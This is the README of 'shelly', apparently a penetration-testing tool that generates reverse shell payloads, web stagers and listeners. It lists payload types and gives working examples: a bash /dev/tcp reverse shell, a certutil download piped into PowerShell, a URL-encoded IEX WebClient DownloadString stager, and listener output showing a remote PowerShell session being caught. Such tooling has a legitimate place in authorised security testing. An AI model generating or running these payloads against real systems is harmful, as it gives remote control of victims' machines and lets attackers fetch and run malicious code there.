# shelly
(mainly reverse shell) payload generator (and shell catcher) written in python2.7

Tool created to automate the creation of payloads to get a reverse shell, making easier to encode it, or serve it using a stager. It's made in a way that is very easy to add more payloads, stagers and connectors.

### Payloads
* reverse_icmp_powershell
* reverse_tcp_bash
* reverse_tcp_bash (using setsid)
* reverse_tcp_bash_openssl (encrypts connection)
* reverse_tcp_netcatbsd (no -e option)
* reverse_tcp_perl
* reverse_tcp_php
* reverse_tcp_phpmonkey (oneliner based on pentest monkeys php rev shell)
* reverse_tcp_powercat (powershell, stager required)
* reverse_tcp_powershell
* reverse_tcp_python
* reverse_udp_dnscat2(powershell, stager required)
* reverse_udp_netcatbsd (no -e option)
* reverse_udp_perl
* reverse_udp_python

### Stagers
Various techinques used to deliver staged payloads. Only http at the moment:
* certutil & powershell -ep bypass -nop -f
* certutil & type 2 powershell -nop -
* echo IEX Webclient 2 powershell -nop -


### Connectors
Connectors are the confguration settings that allow to chatch the shell executed for the payload
* reverse_icmp_icmpsh (require have installed icmpsh and setup the connector file with correct path, elevated privs)
* reverse_tcp_netct listener
* reverse_tcp_ncat_ssl (ssl encrypted listener)
* reverse_udp_dnscat2 (require have ruby + server installed and working prior to use it)
* reverse_udp_netcat listener

## Installation
* ```git clone https://github.com/ompamo/shelly.git```
* configure BASE_PATH on 'shelly' file. Default: /opt/shelly
* ```ln -s /opt/shelly/shelly /usr/local/bin/shelly```
* To enable bash-completion add to your ~/.bashrc file: ```eval "$(register-python-argcomplete shelly)"```

## Extra features
* Auto copy payloads to paperclip (xclip required)
* Generate urlencoded payloads

## Examples
* Generating a reverse tcp bash shell payload
```
root@kali:/opt/shelly# ./shelly rev --payload reverse_tcp_bash --lhost 10.0.2.11 --lport 1234
[*] Payload generated:
/bin/bash -i >& /dev/tcp/10.0.2.11/1234 0>&1
```
* Getting the info for that payload
```
root@kali:/opt/shelly# ./shelly show payload reverse_tcp_bash
[*] bash TCP reverse shell payload
    Info          : bash command to spawn a reverse shell. No special opts required.
    Required Opts : ['LHOST', 'LPORT']
    Connector     : reverse_tcp_netcat
    Payload       : /bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```
* Checking stager info and spawning a PS reverse shell using a web stager on port 8080 and catching the shell
```
root@kali:/opt/shelly# ./shelly rev -p reverse_tcp_powershell -H 10.0.2.11 -P 4444 --stager web_certutil_type2powershell --sport 8080 --param1 c:\\Windows\\Tasks --listen 
[*] Payload generated:
certutil -urlcache -split -f http://10.0.2.11:8080/dJaBEjxo1r c:\Windows\Tasks\dJaBEjxo1r.txt & type c:\Windows\Tasks\dJaBEjxo1r.txt | powershell -nop -
[*] Serving stage at port 8080
10.0.2.4 - - [16/May/2018 14:58:31] "GET /dJaBEjxo1r HTTP/1.1" 200 -
[*] Part 1 of 2 sent
10.0.2.4 - - [16/May/2018 14:58:31] "GET /dJaBEjxo1r HTTP/1.1" 200 -
[*] Part 2 of 2 sent

[*] Reverse TCP Netcat listener - No additional info
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.0.2.4 49196 received!

PS C:\> 

```
* Also we can get it urlencoded (to work with ie with curl or other tools)
```
root@kali:/opt/shelly# ./shelly rev -p reverse_tcp_powershell -H 10.0.2.11 -P 4444 --stager web_echo2powershell --urlencode -l
[*] Payload generated:
echo%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2F10.0.2.11%3A80%2Fu5KWfOkL6b%27%29%20%7C%20powershell%20-nop%20-
[*] Serving stage at port 80
...
```

### External scripts used on this project as payloads
* [PowerCat.ps1](https://github.com/besimorhino/powercat) from Besimorinho
* [Inovke-PowerShellIcmp.ps1](https://github.com/samratashok/nishang) from Samratashok
* [dnscat2.ps1](https://github.com/lukebaggett/dnscat2-powershell) from Luke Bagget
* [php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) from PentestMonkey
